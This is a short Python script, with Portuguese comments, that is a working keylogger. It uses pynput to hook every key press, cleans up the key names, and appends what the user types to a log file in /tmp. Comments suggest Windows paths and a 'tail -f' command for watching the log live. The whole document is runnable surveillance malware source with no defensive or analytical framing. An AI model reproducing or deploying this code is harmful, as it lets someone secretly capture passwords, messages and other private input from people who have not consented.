from pynput.keyboard import Listener;
import re


##/home/deivid/'Área de trabalho'/keylog.txt


## tail -f /tmp/key/key.log

## se for windows, apenas colocar o seguinte comando, de acordo com o seu diretório ##
## C:\seuUsuario\desktop\... ##
arquivoLog = "/tmp/key.log";

def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla);
    tecla = re.sub(r'Key.enter', '\n', tecla);
    tecla = re.sub(r'Key.*', '', tecla);


    with open(arquivoLog, "a") as log:
        log.write(tecla);



with Listener(on_press = capturar) as l:

    l.join()



